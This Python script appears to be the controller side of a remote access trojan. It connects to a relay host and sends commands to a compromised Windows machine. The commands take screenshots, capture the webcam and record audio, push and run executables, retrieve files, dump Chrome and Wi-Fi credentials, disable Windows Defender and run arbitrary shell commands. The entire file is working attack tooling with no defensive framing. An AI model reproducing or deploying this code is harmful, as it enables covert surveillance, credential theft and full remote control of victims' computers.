import socket
import pickle
import struct
import time
import soundfile as sf


bridge = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
bridge.connect(("192.168.1.36", 9999))

bridge.send(b"master")


def receive(cli):
    data = b""
    payload_size = struct.calcsize(">L")
    while len(data) < payload_size:
        received = cli.recv(4096)
        data += received
    packed_msg_size = data[:payload_size]
    data = data[payload_size:]
    msg_size = struct.unpack(">L", packed_msg_size)[0]
    while len(data) < msg_size:
        data += cli.recv(4096)

    frame_data = data[:msg_size]

    # data = data[msg_size:]

    return pickle.loads(frame_data, fix_imports=True, encoding="bytes")


def send(data, cli):
    data = pickle.dumps(data, 0)
    size = len(data)
    cli.sendall(struct.pack(">L", size) + data)


while True:
    command = input("cmd>")
    send(command, bridge)

    if command == "screenshot":
        with open(f"screenshot{time.time()}.jpg", "wb") as f:
            f.write(receive(bridge).tobytes())

    elif command == "camera capture":
        with open(f"camera{time.time()}.jpg", "wb") as f:
            f.write(receive(bridge).tobytes())

    elif "inject " in command:  # inject run.exe
        exe = command.replace("inject ", "")
        with open(exe, "rb") as f:
            data = f.read()
        send(data, bridge)

    elif "retreive " in command:  # retreive pp.exe
        data = receive(bridge)
        exe = command.replace("retreive ", "")
        with open(exe, "wb") as f:
            f.write(data)

    elif (
        command == "cracker chrome"
    ):  # get wifi informations (past data too) and chrome
        data = receive(bridge)
        for line in data:
            print(line)

    elif command == "cracker wifi":  # get wifi informations (past data too) and chrome
        data = receive(bridge)
        for line in data:
            print(line, data[line])

    elif command == "disable defender":
        print(receive(bridge))

    elif "sound record" in command:  # sound record 15
        data = receive(bridge)
        sf.write(f"soundrecord{time.time()}.wav", data, 44100)

    elif command == "info":
        data = receive(bridge)
        for line in data:
            print(line, data[line])

    else:  # cmd
        print(receive(bridge))
